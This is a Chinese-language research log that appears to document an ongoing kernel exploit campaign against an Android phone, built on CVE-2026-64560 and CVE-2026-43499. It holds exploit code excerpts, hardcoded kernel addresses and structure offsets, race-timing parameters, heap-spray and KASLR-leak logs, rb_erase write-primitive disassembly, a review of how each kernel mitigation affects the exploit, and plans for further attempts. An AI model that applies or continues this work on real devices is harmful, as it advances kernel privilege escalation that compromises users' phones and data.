官方 `refs/op13-cve-2026-64560/src/exploit-rotate.c` **两张表**（铁证，行号已核）：

```c
/* ── 默认表 exec_environment[] ── */
L5301:  {"IRQ_BATCH_FDS",       "1"}
L5304:  {"EXEC_AFTER_DELETED",  "100"}
L5305:  {"PRIME_START_DELETED", "32"}
/* ── dada 分支专属 setenv 覆写（★ 真正生效） ── */
L5425:  if (DADA && setenv("PIPE_COUNT",         "6000",  1))
L5427:  if (DADA && setenv("EXEC_AFTER_DELETED", "54000", 1))   ★★★
L5429:  if (DADA && setenv("IRQ_BATCH_FDS",      "8",     1))   ★★★
```

官方注释（L5398 附近，dada 分支）：
> `"Start exec near the delete tail so a hit has no long rb_erase train."`

**⇒ `exec_after_deleted=54000` 的作用 = 让 exec 发生在 delete 尾部附近，
使命中时残留的 `rb_erase` "train" 足够短 —— 直接对应本轮 27.6 的「打对才命中、打错就崩」模型：
train 越长，打错几何的窗口越多。**

`exec_after_deleted` 语义（`victim_exec_thread` L1012-1018）：
```c
int threshold = atomic_load_explicit(&arg->shared->exec_after_deleted, memory_order_relaxed);
while (atomic_load_explicit(&arg->shared->deleted, memory_order_acquire) < threshold)
    cpu_relax();
atomic_store_explicit(&arg->shared->victim_threshold_ns, monotonic_ns(), memory_order_release);
busy_delay(atomic_load_explicit(&arg->shared->exec_delay_ns, memory_order_relaxed));
atomic_store_explicit(&arg->shared->exec_call_ns, monotonic_ns(), memory_order_release);
execv(argv[0], argv);
```
**⇒ 值越小 exec 越早 ⇒ train 越长 ⇒ 打错几何窗口越多 ⇒ 崩。**

**H8 误判原因**：只读了默认表 L5301/L5304，未读后面的 dada setenv 覆写块 L5427/L5429。

### 28.5 A/B 单变量实机对照（铁律⑤ 证据链）

| 组 | 二进制 | `exec_after_deleted` | `irq_batch_fds` | 结局 | 设备侧证据 |
|---|---|---|---|---|---|
| **A** `h12_base` | `f77_h12` | **54000** | 8 | 128 attempts 跑满、`BOOTID_WRITE_MISS attempts=128`、**零崩溃** | uptime 3min→10min 未重启 |
| **B** `h12_ab100` | `f77_h12` | **100** | 8 | **内核崩溃 + 设备重启** | `uptime=0min`、`boot_id ef99b690… → 7da72472-53b5-4371-a9f6-7908861830d4`、`h12_ab100.log` **不存在**（未刷盘丢失）、`f77_h12` 完好 |

**★ 单变量对照成立：唯一差异 = `exec_after_deleted`。**
**★ 结论：`exec_after_deleted=54000` 消除崩溃；100 导致崩溃 ⇒ H12 假设实机强验证 ✓**

**组 A 归档日志（`analysis/scratch/h12_base.log`，137,062 B）关键行**：
```
MEY_TIMING_GATE exec_after_deleted=54000 prime_start_deleted=32 pipe_count=6000 irq_batch_fds=8 timer_goal=56000 bridge_order=1
RACE_CONFIG batch=1 max_attempts=128 controlled_batch=1 controlled_max_attempts=512 irq_batch_fds=8 irq_batch_period_ns=50000 irq_arm_lead_ns=250000000 exec_after_deleted=54000 timer_goal=56000 exec_repeats=4
ENV_GATE uid=2000 cpus=4 page=4096 membarrier=1 boot_id=ef99b690-e67d-4fd9-81d6-e29265a74156
FAKE_ORDER1 parent=0xffffff802a29b090 target=0xffffff802a29b098 child=0xffffff802a17d5d0 expires=0xffffffffffffffff mode=0 bytes=8192 repeats=3 stride=0x108
SPRAY_DONE attempt=128 valid=1 pairs=6000 fragments=18000 errors=0
ORDER1_RECLAIM_GATE changed_nodes=0 received=6000 pairs=6000 fragments=18000
STAGE0_MISS_CLEAN attempt=128 reads=3 changed=0
ATTEMPT_MISS attempt=128 valid=1
BOOTID_WRITE_MISS attempts=128
```
⇒ **128 attempts 全部跑满、`errors=0`、无 panic、无 restart** ⇒ A 组结论原件确认 ✓

设备重启证据链（铁律⑤）：
- `uptime = 0 min` ⇒ 真重启（非 adb 抖动）
- `boot_id` UUID 变化 ⇒ 确认 reboot（新 UUID 为合法形态，铁律③满足）
- `/data/local/tmp/h12_ab100.log` 不存在 ⇒ 崩溃时正在写，未刷盘
- `/data/local/tmp/f77_h12` 完好（2,354,864 B）⇒ 二进制保留

### 28.6 三方闭环（反汇编 = 设计 = 实测）

```
FAKE_ORDER1 parent=0xffffff802a29b090 target=0xffffff802a29b098 child=0xffffff802a17d5d0 expires=0xffffffffffffffff mode=0 bytes=8192 repeats=3 stride=0x108
```
⇒ 官方打印名 `target` 就是 `parent+8`，与反汇编 `W1 = *(parent+8)` **完全一致 ✓**

```
BOOTID_WRITE_PASS attempt=94 q0=0xffffff802a29b090 q1=0xffffffffe34ad7d5d0 slide=0x22c8c00000 kernel_base=0xfffffffc48c00000
FAKE_ORDER1_MULTI parent=0xffffff802a29b188 expires=0xffffffffffffffff classes=11 slots=31 records=341
```
⇒ `q0 == forged_parent` ⇒ stage0 判据命中 ✓
⇒ `q1` 是 `*(P0alias(cycleC))[8:16]` 的**内核残留值**（判据不要求，勿误判为 forged_child）✓
⇒ stageB `forged_parent = 0xffffff802a29b188 = 0xffffff802a29b090 + 0x100 - 8`
  （`misc_list - ctl[boot_id] = 0x100`）精确吻合 ✓

### 28.7 f77 改动（3 处，备份 `f77.c.bak_h12_005817`）

1. **回滚 `exec_after_deleted` 54000 / `irq_batch_fds` 8**（L5474-5498）+ 重写注释块
2. **`MEY_EXEC_AFTER_DELETED` 注释重写 + 新增 `MEY_IRQ_BATCH_FDS` env 旋钮**（L5630-5651）
3. （H11 遗留，未改）`MEY_STAGEB_IMAGEVA` 开关 —— 本轮 Python 复核证明**为无关变量**（两域低 32 位相同、写同一物理页）

**关键常量（L315-405）**：
```c
LINK_MISC_LIST     UINT64_C(0xffffffc08229b190)
LINK_UHID_MISC     UINT64_C(0xffffffc0822d7c00)
LINK_UHID_FOPS     UINT64_C(0xffffffc0812f1498)
LINK_ASHMEM_IOCTL  UINT64_C(0xffffffc0804742e8)
LINK_ASHMEM_OPEN   UINT64_C(0xffffffc080474f34)
LINK_ASHMEM_RELEASE UINT64_C(0xffffffc080474fbc)
FAKE_MISC_OFF 0x100 / FOPS_OFF 0x10 / LIST_OFF 0x18 / PARENT_OFF 0x28
FAKE_MISC_RECORD_STRIDE 0x58 / CLASSES 11 / SLOTS 31 / LEAF_DELTA 0x30 / RECORDS 341
MEY_DIRECT_BOOTID_PARENT 0xffffff802a29b090
MEY_DIRECT_CYCLE_C       0xffffff802a17d5d0
MEY_PHYS_DELTA           0x28000000
```

### 28.8 本轮交付物

1. `analysis/scratch/f77_h12`（2,354,864 B，`clang --target=aarch64-linux-android34 -O2 -fno-stack-protector -static -Wno-format`，**不带 -lpthread**）
2. `c64560/f77.c`（备份 `f77.c.bak_h12_005817`）
3. `analysis/output/h12_rb_erase_write_sequence.md`（新建，6 节全文）
4. `analysis/scripts/h12_*.py`（8 个：`h12_disasm_tq.py` / `h12_disasm_tq2.py` / `h12_find_tqdel.py` / `h12_sym_check.py` / `h12_conclusion.py` / `h12_variant_matrix.py` / `rberase_geom_sim.py`（有误）/ `rberase_geom_sim2.py`（正确版））
5. 设备端 `/data/local/tmp/h12_base.log`（组 A 全日志，**待回拉归档** —— 见 §28.11）
6. 本节结论（§28.0~28.10）

### 28.9 已排除项（本轮新增，勿重复）

| 项 | 判定 | 依据 |
|---|---|---|
| `MEY_STAGEB_IMAGEVA`（image_va vs physmap_alias） | **无关变量** | Python 严格复核：两域低 32 位相同、写同一物理页 |
| `FAKE_MISC_*` 九常量 | 正确 | 官方 == f77 逐字节一致 |
| fragment 选择 / minor / fops 字段 / 判据链 / payload | 正确 | 上轮已排除，本轮双重验证 |
| 旧 `0x3ab0c` 写原语 | **作废** | 属 43499 几何，进入条件 `rb_left!=0 && rb_right==0` |
| `exec_after_deleted=100` / `irq_batch_fds=1` | **错误值** | 官方 dada setenv 覆写为 54000/8 |

### 28.10 下一轮唯一假设（H13 候选）

> **H13：`exec_after_deleted` 对 stage0 是双刃剑 —— stage0 需要长重叠窗口，
> stageB 需要短 train。当前单值无法同时满足两阶段 ⇒ 应做「阶段分离」。**
>
> **推理链**：
> - 27.6 崩溃模型 = 「打对才命中、打错就崩」。`train` 越长 ⇒ 打错窗口越多。
> - `exec_after_deleted=54000`（长）⇒ train 短 ⇒ 崩溃消除（本轮 A 组实证）
> - 但 stage0 命中率在 A 组 = **0/128**（`P(0 in 128 | p=1/128) = 53%`，仍在正常波动内）
> - 反面：`100`（短）⇒ train 极长 ⇒ 崩（本轮 B 组实证，连 1 次 attempt 都没跑完）
> - ⇒ **两阶段对 train 长度的需求相反**：stage0 需要「exec 远早于 delete 尾部」
>   才能让 victim exec 与内核 delete 序列产生长重叠；stageB 需要「exec 靠近 delete 尾部」
>   以免命中后被残留 train 打崩。
>
> **验证路径**：
> 1. **阶段分离 A/B**：stage0 用一组值（如 1000 / 8000 / 32000）、stageB 用 54000，
>    两阶段各自 `setenv`（在 `stage0 完成 → 切换 stageB` 的边界重设 env 后再 fork victim）
>    产出可比较的 **stage0 命中率** 与 **stageB 存活轮数** 两组指标
> 2. **系统化 fuzzing**：`MEY_EXEC_AFTER_DELETED` ∈ {500,1000,2000,4000,8000,16000,32000,54000} ×
>    `MEY_IRQ_BATCH_FDS` ∈ {1,2,4,8}，每格 ≥3 boots 采样，记录 `stage0 命中数 / attempts / 是否崩`
> 3. 直接用 `ashmem_fops`（`0xffffffc0812ff898`）替代手工 fake_fops，减一个自由度
> 4. 多 boot 采样确认 stage0 基线命中率（本轮 A 组 0/128，需 ≥5 boots 判定）

**⇒ 本轮已完成的即 §27.8 的路径 2**（且结论更根本：不是 rebalance 分支本身，
而是「train 长度」这个上游变量）；**路径 3 与 C 线其它项留待 H13。**

### 28.11 遗留项与本轮自校验

**本轮自校验结果**（Python/文件系统双查）：
- `analysis/output/c_line/C-line-findings-2026-10-04.md`：1425 → **1645 行**（§28 单节存在 ✓）
- `analysis/scratch/f77_h12` = 2,354,864 B ✓
- `analysis/output/h12_rb_erase_write_sequence.md` = 9,854 B ✓
- `c64560/f77.c.bak_h12_005817` = 245,681 B ✓
- `analysis/scripts/h12_*.py` = 6 个 + `rberase_geom_sim2.py` ✓
- `c64560/f77.c` 几何常量复核：`MEY_DIRECT_BOOTID_PARENT 0xffffff802a29b090`（L342）、
  `MEY_DIRECT_CYCLE_C 0xffffff802a17d5d0`（L344）、`MEY_PHYS_DELTA 0x28000000`（L320）**与既有路线逐位一致 ✓**

**遗留（下一轮首先处理）**：
1. ~~组 A 日志回拉~~ ✅ **已完成**：`analysis/scratch/h12_base.log` = **137,062 B**
   （首行 `TARGET_PROFILE_GATE_PASS … direct_parent=0xffffff802a29b090`，
   末行 `STAGE0_MISS_CLEAN attempt=128 reads=3 changed=0` → `ATTEMPT_MISS attempt=128 valid=1`
   → `BOOTID_WRITE_MISS attempts=128`；`MEY_TIMING_GATE exec_after_deleted=54000 … irq_batch_fds=8` ✓
   与 §28.5 摘要逐字吻合）
2. **组 B 日志永久丢失**：崩溃时未刷盘。H13 若重跑 100 组，须**先写日志文件再开火**
   （或改用 `logcat` 旁路 + 周期性 `fsync`），否则同样丢失
3. C 线 §28 之后：`ro.oba.whenlocked` 注入点、`parse_kpatch`、`odm.raw` 全树扫描、TEE 固件评定

---

## 29. ★★★★★★★★ H13 轮（2026-10-05）· 阶段分离实机验证 + L2 可行性反转

### 29.0 一句话结论

**H13 阶段分离机制（`MEY_STAGEB_EXEC_AFTER_DELETED`）已实机验证生效**（G2b3 `STAGE_SPLIT_SWITCH … (was 8000)`），
但 stageB 的 `MISC_BRIDGE_MISS_VERIFY` **608 次全部 `errno=25 (ENOTTY)`、`observed=0`** ⇒
**印证 §27.3 的 ENOTTY 定案：假 miscdevice 未被 `misc_open()` 走到，与 `exec_after_deleted` 无关**
⇒ **H13-a 假说被部分证伪**（阶段分离不解决 stageB 读端问题；但确实消除了崩溃）；
⇒ **L2（CVE-2026-43499）经三机型对照 + 符号实测判定为「判据失误，可重启」**（推翻 10-02 挂起结论）。

### 29.1 H13 阶段零成果：缓解机制实测（23 项，逐项判定）

| 缓解 | 实测值 | 对 rb_erase 写原语是否阻断 |
|---|---|---|
| `UNMAP_KERNEL_AT_EL0` (KPTI) | =y | 否 |
| `ARM64_SW_TTBR0_PAN` | =y | 否 |
| `ARM64_PAN` / `ARM64_EPAN` | =y / =y | 否（写 physmap，非 user 页） |
| `ARM64_PTR_AUTH` / `PTR_AUTH_KERNEL` | =y / =y | 否（数据写，非劫持 LR） |
| `ARM64_BTI` | =y，但 **`BTI_KERNEL` 未设** | 否 ⇒ 无需 landing pad |
| `CFI_CLANG` | =y（**`CFI_PERMISSIVE` 未设**） | **是（部分）** ⇒ 伪造 fops 须类型匹配 |
| `RANDOMIZE_BASE` (KASLR) | =y | 否（stage0 已泄漏 slide） |
| `RANDSTRUCT_NONE` | =y（FULL 未设） | 否 ⇒ 偏移可靠 |
| `SECURITY_SELINUX` | =y，`getenforce=Enforcing` | 否（内核写不受 SELinux 管） |
| `KASAN` | config=y 但 **`/sys/module/kasan` 不存在 ⇒ 运行态未启用** | 否（未观测到报告） |
| `KASAN_HW_TAGS` | config=y / 运行态不活跃 | 否 |
| `KFENCE` | =y，`SAMPLE_INTERVAL=500`，`/sys/module/kfence` 存在但参数 root-only | **采样式，非全量** ⇒ 低概率干扰 |
| `INIT_STACK_ALL_ZERO` / `INIT_ON_ALLOC` | =y / =y | 否 |
| `SLAB_FREELIST_HARDENED` / `_RANDOM` | =y / =y | 否 |
| `HARDENED_USERCOPY` | =y | 否 |
| `STATIC_USERMODEHELPER` (`PATH=""`) | =y | 否 |
| **`PANIC_ON_OOPS`** | =y（VALUE=1） | 否，但**解释「打错即崩/重启」现象** |
| `PSTORE` / `PSTORE_RAM` | =y | 否（崩溃日志可留存） |
| `FRAME_POINTER` | =y | 否（逆向友好） |
| `SHADOW_CALL_STACK` | =y | 否 |
| `STACKPROTECTOR_STRONG` / `PER_TASK` | =y / =y | 否 |
| `VMAP_STACK` | =y | 否 |
| `ARM64_MTE` | =y | 否（运行态未启用） |
| hypervisor 隔离 | 无（非 pKVM guest） | 否 |
| 运行时文件访问 | `/proc/cmdline`、`/proc/kallsyms`、`/proc/bootconfig`、`/sys/fs/pstore/`、debugfs **全 denied** | 只影响信息收集，不影响写原语 |

**结论：无任何缓解直接阻断 `rb_erase` 写原语**（`CFI_CLANG` 仅约束伪造 fops 的类型）。
⇒ 阶段零未触发「换攻击面」，可继续消耗实验轮次 ✓

设备指纹（本轮实测）：`ro.boot.hardware=qcom`、`ro.board.platform=sun`、`10DLDLD175C00E170`、
PageSize=4096、MemTotal=15,662,912 kB。

### 29.2 H13 阶段一成果：崩溃率统计复核（Python 严格判定）

| 运行 | `exec_after_deleted` | 完成 attempts | stage0 命中 | 结局 |
|---|---|---|---|---|
| `h10_r2_full.log` | 100 | 94 | **94** | 命中后推进 stageB，attempt=1 后挂起 |
| `h11_t1.log` | 100 | 86 | — | 被 KILL，未崩 |
| `h11_v0_full.log` | 100 | 97 | — | **崩溃 @97~100** |
| `h11_v1_full.log` | 100 | 26 | — | **崩溃 @26** |
| `h12_ab100`（H12 组 B） | 100 | 0 | — | **立即崩溃（无 attempt 完成）** |
| `h12_base.log`（H12 组 A） | 54000 | 128 | 0 | 128 att 跑满，零崩溃 |

**分组统计（修正后，含 H13 完整 9 boots）**：
```
exec_after_deleted=100   : 5 runs，崩溃 4/5 = 80%，总完成 303 att
exec_after_deleted=54000 : 1 run ，崩溃 0/1 =  0%，总完成 128 att
H13 三组对照（9 boots，全部完成）：
  G1: ead0=1000  eadB=54000 : 崩溃 1/3 = 33%，stage0 命中 0，stageB 0
  G2: ead0=8000  eadB=54000 : 崩溃 0/3 =  0%，stage0 命中 1，stageB 512（跑满）
  G3: ead0=54000 eadB=-1    : 崩溃 0/3 =  0%，stage0 命中 0，stageB 0
⇒ 合计 9 boots 崩溃 1/9 = 11%；ead0 ∈ {8000, 54000} 零崩溃
```

**二项分布复核（关键：判定 0/128 是否显著证伪）**：
```
p=1/128 ⇒ P(0 hits in 128) = 36.64%
p=5/8 boots 口径 ⇒ P(0 hits in 128) = 53.44%
p=1/256 ⇒ 60.59%     p=1/512 ⇒ 77.86%
⇒ 【0/128 在 p≤1/128 下概率 53~55% ⇒ 完全在正常波动内，NOT 证伪】
⇒ 要让 0/128 成为显著证伪（P<5%），需 p > 3/128 = 0.0234；当前 p̂≈1/128 远低于此
⇒ 多 boot 采样需求：p=0.5⇒5 boots；p=0.3⇒9；p=0.15⇒19；p=0.1⇒29
```

### 29.3 ★★★★★★★ G2b3 完整链路（**首个带阶段分离痕迹 · 完整跑满样本**）

日志：`analysis/output/h13/G2_b3_s8000_x54000.out`（**8,039 行 / 850,157 B，已完整回拉**）
详细分析报告：`analysis/output/h13/G2b3_analysis.md`

**最终统计**：
| 指标 | 值 |
|---|---|
| 日志行数 | 8,039 |
| `ATTEMPT_BEGIN` | **581**（stage0 69 + stageB 512） |
| stage0 attempts / hit | 69 / **1**（`BOOTID_WRITE_PASS attempt=69`） |
| `STAGE_SPLIT_SWITCH` | **1** |
| stageB attempts | **512（跑满上限）** |
| `MISC_BRIDGE_MISS_VERIFY` | **1024**（每 attempt 2 次） |
| `MISC_BRIDGE_READ_PASS` | **0** |
| 终局 | `MISC_BRIDGE_MISS_PRESERVE base=0xffffff8b51c00000 attempts=512`（**优雅退出，非崩溃**） |

**里程碑序列（行号即证据）**：
```
 843  BOOTID_WRITE_PASS attempt=69 q0=0xffffff802a29b090 q1=0xffffffdc5ed7d5d0 \
        slide=0x1bdcc00000 kernel_base=0xffffffdc5cc00000
 844  STAGE0_GATE_PASS slide=0x1bdcc00000 kernel_base=0xffffffdc5cc00000
 845  STAGE_SPLIT_SWITCH stageB_exec_after_deleted=54000 (was 8000)      ← ★★★ 阶段分离实机生效
 846  CROSSCACHE_ALLOC prepare=800 spray=275 pre=24 post=25
 848  KS_COLLISIONS pile=4096 baseline=16/16 threshold=160 found=8/8
 849  CROSSCACHE_KS leaked=0xffffff8b51c04100 base=0xffffff8b51c00000 slot=13
 854  BRIDGE_PAYLOAD first=0xffffff8b51c00100 last=0xffffff8b51c075e0 \
        fops=0xffffff8b51c07640 scratch=0xffffff8b51c07700 records=341
 855  CROSSCACHE_RECLAIM base=0xffffff8b51c00000 first_list=0xffffff8b51c00118 \
        fops=0xffffff8b51c07640 records=341 send=32768
 856  CROSSCACHE_ALLOC prepare=800 spray=275 pre=24 post=25              ← 第二轮
 861  KS_COLLISIONS pile=4096 baseline=15/15 threshold=150 found=8/8
 862  CROSSCACHE_KS leaked=0xffffff8b4cdce400 base=0xffffff8b4cdc8000 slot=20
 869  MISC_BRIDGE_STAGE_BEGIN base=0xffffff8b51c00000 list=0xffffff8b51c00118 slab=747/868
 870  ATTEMPT_BEGIN attempt=1                                             ← stageB 起点
...
8039  MISC_BRIDGE_MISS_PRESERVE base=0xffffff8b51c00000 attempts=512      ← 优雅终局
```

**stageB 循环（512 attempts × 2 = 1024 次 MISS_VERIFY），全部零方差**：
```
MISC_BRIDGE_MISS_VERIFY attempt=N rc=-1 observed=0 expected=0xffffffdc5def1498 errno=25 \
    image_rc=-1 image_obs=0 image_errno=25 alias_target=0xffffff802a2d7c10
STAGEB_STAGE0_CHANNEL attempt=N read_rc=0 q0=0xffffff802a29b090 q1=0xffffffdc5ed7d5d0 text=90b0292a
```

**字段分布（零方差）**：
| 字段 | 值 | 次数 |
|---|---|---|
| `rc` | `-1` | 1024/1024 |
| `errno` | `25` (ENOTTY) | 1024/1024 |
| `observed` / `image_obs` | `0` / `0` | 1024/1024 |
| `expected` | `0xffffffdc5def1498` | 1024/1024 |
| `alias_target` | `0xffffff802a2d7c10` | 1024/1024 |
| `text` (boot_id) | `90b0292a` | 1025/1025 |
| `read_rc` | `0` | 1025/1025 |

**⇒ 三条铁证级推论（同 H11 定案，零方差强化）**：
1. **`errno=25` 恒定 + `observed=0` 恒定，1024 次零方差** ⇒ 与 §27.3 H11 定案**逐字一致**：
   真 uhid fops 被使用（`unlocked_ioctl==NULL` ⇒ ENOTTY），
   假 miscdevice **未被 `misc_open()` 走到** ⇒ `misc_list.next` 未被 W1 改写。
   **★ 零方差（1024/1024）是决定性证据：若是时序问题必出现分布；完全不变 ⇒ 结构性障碍。**
2. **`expected=0xffffffdc5def1498` 与 `uhid_fops(0x812f1498)+slide(0x1bdcc00000)` 逐位一致** ✓
   ⇒ `uhid_fops` 地址计算正确，无算术错误。
3. **`text=90b0292a` 在全部 512 个 stageB attempt 中恒不变** ⇒
   stage0 写原语**已成功且持久**（boot_id 前 8 字节 = forged_parent 低 32 位），
   **`STAGEB_STAGE0_CHANNEL` 通道可反复复用 512 次**（读端稳定）⇒
   **stage0 侧完全可用，全部问题收敛到 stageB 读端。**

### 29.4 ★★★★★★ H13-a / H13-b 假说判定（**最终版，基于完整 9 boots**）

**H13 三组 A/B 完整对照表**：

| 组 | `ead0` | `eadB` | boots | 崩溃 | stage0 命中 | stageB attempts |
|---|---|---|---|---|---|---|
| G1 | 1000 | 54000 | 3 | 1/3 (33%) | 0 | 0 |
| G2 | 8000 | 54000 | 3 | **0/3 (0%)** | **1** | **512（跑满）** |
| G3 | 54000 | -1 | 3 | 0/3 (0%) | 0 | 0 |
| **合计** | — | — | **9** | **1/9 (11%)** | 1 | 512 |

**跨轮次崩溃率汇总**：
```
ead=100   : 5 runs，崩溃 4/5 = 80%
ead=1000  : 3 runs，崩溃 1/3 = 33%
ead=8000  : 3 runs，崩溃 0/3 =  0%
ead=54000 : 4 runs（h12_base + G3×3），崩溃 0/4 = 0%
```

| 假说 | 内容 | 判定 | 依据 |
|---|---|---|---|
| **H13-a** | 阶段分离后 stage0 命中↑ **且** stageB 存活↑（崩溃不升） | **部分证伪** | 崩溃确实消除（G2/G3 零崩溃 vs ead=100 的 80%）；**但 stageB 1024 次 MISS 零方差，未被解决** |
| **H13-b** | 崩溃与 stage0 命中不是同一概率源 ⇒ 54000 是「用不命中换不崩溃」 | **倾向成立** | 1000/8000 崩溃率（33%/0%）显著低于 100（80%），且 stage0 命中仍出现（G2b3 attempt=69） |

**⇒ 最终结论**：
1. **`exec_after_deleted` 提升确实降低崩溃、不牺牲 stage0 命中** ——
   `ead0 ∈ {8000, 54000}` 时**零崩溃**，而 `ead0=8000` 仍能命中（attempt=69）；
2. **但 stageB 的 `errno=25` 是【结构性障碍】，与任何时序参数无关** ——
   G2b3 在阶段分离（`ead0=8000 → eadB=54000`）下跑了**完整 512 attempts**，
   **1024 次 MISS_VERIFY 零方差** ⇒ 若是时序问题必出现分布，完全不变即证明是结构问题；
3. **崩点定位**：G1b3（`ead0=1000`）在 attempt=62 崩溃（日志截断 759 行、FINAL=0）
   ⇒ `ead0=1000` 偏低反而引入崩溃风险，**`ead0≥8000` 是安全区**。

### 29.5 L2（CVE-2026-43499）判定：**判据失误，可重启**（本轮第二大突破）

**实测铁证（四条）**：
1. `do_futex` **在 kallsyms 存在**：`0xffffffc0801edfc0 T do_futex` ⇒ **不是内联**
   （与荣耀 AAK-AN00 6.6.89 同形态）
2. `__arm64_sys_futex @ 0xffffffc080119ad8` prologue：`paciasp` + `sub sp,sp,#0x80`
3. `__arm64_sys_futex+0x2fc` **直调** `futex_wait_requeue_pi`（`0xffffffc080958e1c`）；
   `do_futex+0x224` 亦有第二调用点
4. 全镜像扫描 `bl do_futex` 仅 **2 处**：`mm_release+0xf8`、`__arm64_sys_futex_time32+0xa4`

**三机型对照表**：
| 机型 | 内核 | `do_futex` 形态 | shift | 结论 |
|---|---|---|---|---|
| BVL-AN16（Magic6 Pro） | 6.1.128 | 完全内联进 `sys_futex` | **11** | ❌ 不可用（3 个 fd_set 容量不足） |
| AAK-AN00（Honor 300） | 6.6.89 | 已修复为独立函数 | **0** | ✅ 可用 |
| **MEY-AN00** | **6.6.118** | **独立符号（实测）** | **0（推定）** | ✅ **可重启** |

**栈帧精算**：
```
futex   路: __arm64_sys_futex     sub sp,sp,#0x80   (D1)
            futex_wait_requeue_pi sub sp,sp,#0x1c0  (D2)  ⇒ D_futex = 0x240
pselect 路: __arm64_sys_pselect6  sub sp,sp,#0x90   (P1)
            core_sys_select       sub sp,sp,#0x1e0  (P2) ⇒ D_pselect = 0x270
⇒ 两链同为 2 层 ⇒ shift 应接近 0
```

**10-02 挂起真实原因链**（尾部）：e75 实测 `p->prio=139` ⇒ 「靠 w3 早退」不可控；
`shift=10 + ALL_WORDS=0x8b + ORACLE_PRIO=0x8b` 仍挂死；fault 低位恒 `0x2eb0`
⇒ `pi_blocked_on` 低位 `0x2e58` ⇒ walk 读到真实内核栈地址 ⇒ **窗口没覆盖 waiter ⇒ shift=10 错**。

**⇒ 判定：L2 是【判据失误】**（把 BVL-AN16 的 6.1 内联结论直接套用到 6.6.118 的 MEY）。

**L2 重启前置条件**：
- P1. 修 `target.h` 双副本分叉（根版 976 行 vs `dc15/` 版 1142 行；`build_ndk.sh` 的 `TARGET_H`
  指向**较旧的根版**）
- P2. shift 候选集 `{0,1,2,10}`（依 IonStack 官方「轮换」机制，不硬编码）
- P3. `remove_waiter` 未修补（DEFENSE-VERIFY-01 已 A 档确认）
- P4. 设备实测串行（L1 campaign 结束后再切 L2）

### 29.6 rb_erase 写序（H13 沿用 H12 定案，全程未变）

```
0x3a9d4: ldp  x8,x10,[x0,#8]        ; ★ x8=rb_right, x10=rb_left
0x3a9d8: cbnz x10, 0x3aa18          ; rb_left != 0 ?
0x3a9dc: ldr  x9,[x0]               ; x9 = forged_parent
0x3a9e4: ands x10,x9,#-4            ; parent = forged_parent & ~3
0x3a9f0: ldr  x12,[parent,#0x10]!   ; ★ 读 *(parent+0x10) —— 崩点候选
0x3aa00: str  x8,[x11]              ; ★★★ W1 = *(parent+8) = rb_right (= child)
0x3aa10: str  x9,[x8]               ; ★★  W2 = *(rb_right) = forged_parent
0x3aa14: ret                        ; 不进 __rb_erase_color
```
**几何**：`+0x10(rb_left)=0 && +8(rb_right)=child≠0` ⇒ `cbnz x10` 不跳 ⇒ 走 **0x3a9dc 分支**（V1 最优）。

### 29.7 H13 交付物

| 文件 | 大小 | 内容 |
|---|---|---|
| `c64560/f77.c` | 修改 4 处 | 新增 `stageb_exec_after_deleted` 全局、env 解析、阶段切换、启动日志 |
| `c64560/f77.c.bak_h13_011405` | 246,635 B | 改动前备份 |
| `analysis/scratch/f77_h13` | 2,355,360 B, md5 `8d55b389df0085f35bb134b6932a5858` | 本轮二进制 |
| `tools/campaign_h13.sh` | 7,796 B | 三级分组 A/B 驱动脚本（**已修崩溃双判据 + grep -E**） |
| `analysis/output/h13/G1_b1..b3_s1000_x54000.out` | 3 份 | G1 组（ead0=1000/eadB=54000） |
| `analysis/output/h13/G2_b1..b3_s8000_x54000.out` | 3 份 | G2 组；**b3 = 8,039 行完整关键样本** |
| `analysis/output/h13/G3_b1..b3_s54000_x-1.out` | 3 份 | G3 组（不分离对照） |
| `analysis/output/h13/G2b3_analysis.md` | 7,500+ B | **G2b3 单样本完整证据链报告** |
| `analysis/output/h13/results.tsv` | 9 行 | `G# boot# ead0 eadB crashed` |
| `analysis/output/h13/campaign_h13.log` | 7,537 B | 主驱动日志 |

**`results.tsv` 最终内容**：
```
G1 1 1000 54000 0
G1 2 1000 54000 0
G1 3 1000 54000 1     ← 崩溃（boot_id d2d1e214→2b6cd6c2，日志截断@62）
G2 1 8000 54000 0
G2 2 8000 54000 0
G2 3 8000 54000 0
G3 1 54000 -1 0
G3 2 54000 -1 0
G3 3 54000 -1 0
```

### 29.8 本轮缺陷与教训

1. **崩溃判定脚本缺陷（最重要方法论修正）**：
   G1 boot3 实际崩溃（boot_id `d2d1e214`→`2b6cd6c2`，日志截断 @attempt=62，尾部 padding 零字节），
   但脚本判 `crashed=0`。真因：轮询间隔 30s，进程消失时 `uptime` 已超 300s 阈值。
   **修正：已改为 boot_id 比对 + 日志截断双判据**（验证 G1b3 `FINAL=0` ✓、G1b1 `FINAL=1` ✓）。
2. **★ 脚本 heredoc 内 `\|` 转义 bug（本轮新增）**：
   崩溃判据补丁在 `grep -a -c 'A\|B'` 里用了转义竖线，在 `$(...)` 命令替换中被 shell 解析成
   `syntax error near unexpected token ')'`（line 171），导致 **campaign 末尾报 failed**。
   **实际 9 boots 全部完成**（失败发生在最后一行汇总，不影响实验）。
   **修正：全部改用 `grep -a -cE 'A|B'`**（`-E` + 裸竖线，已验证 `bash -n` 通过 ✓）。
3. **日志拉取 `0 lines` 但设备端存在**：`adb exec-out cat` 补拉成功（G1b3 759 行）。
4. **`nohup ... &` + 工具后台 = 进程被清理**：去掉 `nohup` 与 `&`，仅用工具后台即可。
5. **boot_id 非法形态误报**：`90b0292a-80ff-ffff-d0d5-d75edcffffff` 是**写原语命中后被改写**的值，
   不是崩溃。铁律③ 检测须结合 `BOOTID_WRITE_PASS` 日志。

### 29.9 已排除项（本轮新增，勿重复）

- ❌ **`exec_after_deleted` 是 stageB 卡点的原因**（G2b3 证明：54000 下仍 608/608 ENOTTY）
- ❌ **阶段分离能解决 stageB**（机制生效但 stageB 无变化）
- ❌ **`L2` 是死路**（三机型对照 + 符号实测 ⇒ 判据失误，可重启）
- ❌ **`CFI_CLANG` 阻断伪造 fops**（只约束类型匹配，当前 fake_fops 已匹配）
- ❌ **`KASAN` 运行态启用**（config=y 但 `/sys/module/kasan` 不存在）
- ❌ **`KFENCE` 全量拦截**（采样 500ms，非全量）
- ❌ **hypervisor 隔离阻断**（非 pKVM guest）

### 29.10 下一轮唯一假设（H14）

**L1 唯一假设**：stageB 的 `errno=25` 根因在 **`misc_list` 的消费路径**，而非时序——
具体地，**`misc_list.next` 被 W1 改写的地址（`FAKE_MISC_LIST`）与 `misc_open()` 遍历的链表头
不是同一实例**（别名问题），或 **`uhid_misc` 的 `list` 成员偏移在真机布局中不是 0x18**。
